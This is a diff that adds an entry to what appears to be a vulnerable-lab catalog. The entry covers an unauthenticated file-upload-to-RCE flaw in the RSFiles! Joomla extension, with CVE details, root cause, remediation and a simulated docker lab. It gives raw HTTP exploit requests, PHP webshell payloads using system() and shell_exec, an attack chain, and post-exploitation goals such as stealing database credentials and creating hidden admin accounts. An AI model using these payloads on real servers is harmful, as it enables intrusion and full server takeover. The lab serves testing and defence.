@@ -1,5 +1,150 @@
 [
   {
+    "id": "vt-2026-57827",
+    "info": {
+      "name": "RSFiles! for Joomla - Unauthenticated Arbitrary File Upload to RCE (CVE-2026-57827)",
+      "author": "omarkurt",
+      "description": "RSFiles! (com_rsfiles) is a commercial Joomla file and download manager by\nRSJoomla. Versions prior to 1.17.12 contain CVE-2026-57827, an unauthenticated\narbitrary file upload vulnerability in the frontend upload endpoint.\n\nThe vulnerability exists because the upload logic is split across two tasks:\n- rsfiles.checkupload: pre-flight check with permission gate and extension allow-list\n- rsfiles.upload: the write method with NO auth, NO CSRF, and NO file type check\n\nAn attacker can call rsfiles.upload directly, bypassing the security checks,\nand upload a .php file to the web-accessible downloads/ directory, achieving\nunauthenticated remote code execution.\n\nNote: This lab uses a SIMULATED RSFiles! endpoint since the extension is\ncommercial. The endpoint and vulnerability behavior are identical.\n",
+      "targets": [
+        "rsjoomla-rsfiles",
+        "joomla"
+      ],
+      "type": "CVE",
+      "simulated": true,
+      "cve": "CVE-2026-57827",
+      "cwe": "CWE-434",
+      "cvss": {
+        "score": 9.8,
+        "severity": "critical",
+        "metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": 10.0,
+        "severity": "critical",
+        "metrics": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"
+      },
+      "affected_versions": [
+        "< 1.17.12"
+      ],
+      "fixed_version": "1.17.12",
+      "tags": [
+        "cve-2026",
+        "cve-2026-57827",
+        "rce",
+        "file-upload",
+        "unauthenticated",
+        "joomla",
+        "rsjoomla",
+        "rsfiles",
+        "php",
+        "simulated"
+      ],
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-57827",
+        "https://mysites.guru/blog/rsfiles-unauthenticated-file-upload-rce/",
+        "https://www.rsjoomla.com/blog/view/644-unauthenticated-file-upload-fixed-in-rsfiles-version-11712-update-now.html",
+        "https://www.rsjoomla.com/joomla-extensions/joomla-download-manager.html"
+      ]
+    },
+    "vulnerabilities": [
+      {
+        "id": "rsfiles-unauth-upload-rce",
+        "name": "Unauthenticated File Upload via rsfiles.upload Task",
+        "endpoint": "/index.php",
+        "method": "POST",
+        "param": "file (multipart)",
+        "authentication": {
+          "type": "none",
+          "required": false
+        },
+        "request": "POST /index.php?option=com_rsfiles&task=rsfiles.upload HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary\n\n------WebKitFormBoundary\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\nContent-Type: application/x-php\n\n<?php echo 'VULN-CVE-2026-57827'; ?>\n------WebKitFormBoundary--\n",
+        "response": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"status\":\"success\",\"message\":\"File uploaded successfully\",\"url\":\"\\/downloads\\/shell.php\"}\n",
+        "payloads": [
+          {
+            "name": "PHP webshell",
+            "value": "<?php system($_GET[\"cmd\"]); ?>",
+            "note": "Full interactive webshell"
+          },
+          {
+            "name": "Detection probe",
+            "value": "<?php echo \"VULN-CVE-2026-57827\"; ?>",
+            "note": "Non-destructive vulnerability verification"
+          }
+        ],
+        "indicators": {
+          "success": [
+            "\"status\":\"success\"",
+            "\"url\":\"/downloads/"
+          ],
+          "failure": [
+            "Access Denied",
+            "403 Forbidden",
+            "Invalid token",
+            "authentication required"
+          ]
+        },
+        "chain": [
+          "1. Upload PHP file via POST /index.php?option=com_rsfiles&task=rsfiles.upload",
+          "2. Execute uploaded PHP via GET /downloads/<filename>.php",
+          "3. Full RCE achieved without authentication"
+        ]
+      },
+      {
+        "id": "rsfiles-checkupload-bypass",
+        "name": "Bypass Pre-Flight Check via Direct Upload",
+        "endpoint": "/index.php",
+        "method": "POST",
+        "param": "file (multipart)",
+        "request": "POST /index.php?option=com_rsfiles&task=rsfiles.upload HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary\n\n------WebKitFormBoundary\nContent-Disposition: form-data; name=\"file\"; filename=\"evil.php5\"\nContent-Type: application/x-php\n\n<?php echo shell_exec($_GET[\"e\"]); ?>\n------WebKitFormBoundary--\n",
+        "response": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"status\":\"success\"}\n",
+        "note": "Bypasses the rsfiles.checkupload allow-list by going directly to the\nwrite endpoint. PHP files with alternate extensions (.php5, .phtml, .shtml)\nmay also be executable depending on server configuration.\n"
+      }
+    ],
+    "technical": "Root Cause:\nRSFiles! splits upload across two frontend tasks managed by\n/components/com_rsfiles/controllers/rsfiles.php:\n\n1. rsfiles.checkupload (pre-flight):\n   - Checks user permissions (auth)\n   - Validates file extensions against allow-list\n   - Does NOT write the file\n\n2. rsfiles.upload (write):\n   - Accepts file upload via $_FILES\n   - Writes directly to downloads/ directory\n   - NO authentication check\n   - NO CSRF token validation\n   - NO file extension / MIME type validation\n   - Calls Joomla's bundled upload handler with default settings\n\nThe rsfiles.upload task can be called directly via HTTP, skipping the\nrsfiles.checkupload pre-flight entirely. The controller has no site-wide\nauthentication gate and no CSRF token requirement.\n\nBy default:\n- The downloads/ folder is inside the web root\n- No .htaccess protection is applied (opt-in admin setting)\n- PHP execution is enabled in the downloads/ directory\n\nAttack Flow:\n1. Attacker sends POST /index.php?option=com_rsfiles&task=rsfiles.upload\n2. Multipart form contains a .php file (shell, backdoor, etc.)\n3. Controller writes file to /downloads/<filename>.php\n4. Attacker requests /downloads/<filename>.php directly\n5. PHP code executes on the server\n",
+    "impact": "Critical - Unauthenticated Remote Code Execution (RCE).\n\n- Upload and execute arbitrary PHP code on the Joomla server\n- Read Joomla configuration.php containing database credentials\n- Create hidden Joomla Super User accounts\n- Plant persistent backdoors in the web root\n- Pivot to other sites on shared hosting\n- Add server to botnet or spam network\n- Full server compromise with the privileges of the web server user\n",
+    "remediation": [
+      "Update RSFiles! to version 1.17.12 or later immediately",
+      "If update is not possible: delete /components/com_rsfiles/controllers/rsfiles.php",
+      "Enable 'Secure download folder' and 'Secure briefcase folder' in RSFiles > Settings > Files",
+      "Check downloads/ and briefcase/ folders for stray .php files",
+      "Audit server access logs for POST requests to rsfiles.upload not preceded by rsfiles.checkupload",
+      "Check Joomla Users list for unauthorized Super User accounts",
+      "Use RSFirewall! which silently deletes .php uploads by default"
+    ],
+    "disclosure_timeline": [
+      {
+        "date": "2026-07-09",
+        "event": "mySites.guru discovers the vulnerability during source code audit"
+      },
+      {
+        "date": "2026-07-10",
+        "event": "Privately disclosed to RSJoomla; vendor ships fix (1.17.12) same day"
+      },
+      {
+        "date": "2026-07-11",
+        "event": "CVE-2026-57827 assigned, crediting Phil Taylor (mySites.guru)"
+      }
+    ],
+    "poc": {
+      "nuclei": [
+        "vt-2026-57827.nuclei.yaml"
+      ]
+    },
+    "providers": {
+      "docker-compose": {
+        "path": "docker-compose.yaml"
+      }
+    },
+    "post-install": [
+      "Access the application at http://localhost:8383",
+      "Upload endpoint: POST /index.php?option=com_rsfiles&task=rsfiles.upload",
+      "Check endpoint: POST /index.php?option=com_rsfiles&task=rsfiles.checkupload",
+      "Uploaded files: /downloads/<filename>"
+    ],
+    "category": "cves",
+    "added_date": "2026-08-07T15:02:54+03:00"
+  },
+  {
     "id": "vt-2026-3854",
     "info": {
       "name": "GitHub Enterprise Server - X-Stat Field Injection to Pre-Receive Hook RCE",
